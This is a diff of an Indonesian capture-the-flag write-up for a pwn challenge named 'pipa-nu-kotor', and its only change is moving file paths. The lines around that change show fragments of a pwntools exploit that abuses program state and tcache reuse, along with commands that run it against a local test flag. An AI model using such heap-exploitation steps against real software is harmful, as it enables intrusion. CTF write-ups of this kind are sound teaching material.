@@ -21,7 +21,7 @@ Tidak perlu leak/libc/ROP; ini murni logika state dan tcache reuse.
 
 ### 3.2 Script exploit
 
-Tersimpan di `writeups/assets/pipa-nu-kotor/exploit.py`:
+Tersimpan di `docs/assets/pipa-nu-kotor/exploit.py`:
 
 ```python
 p.sendline(b'1'); p.recvuntil(b'mode (rw/ro) : '); p.sendline(b'rw')   # buka rw
@@ -37,7 +37,7 @@ p.sendline(b'5'); p.recvuntil(b'password : '); p.sendline(b'pwned')    # login r
 Menjalankan:
 
 ```bash
-cd writeups/assets/pipa-nu-kotor
+cd docs/assets/pipa-nu-kotor
 echo 'NFX{LOCAL_TEST_FLAG_PIPA}' > flag.txt
 python3 exploit.py | tee 03-exploit-run.txt
 ```
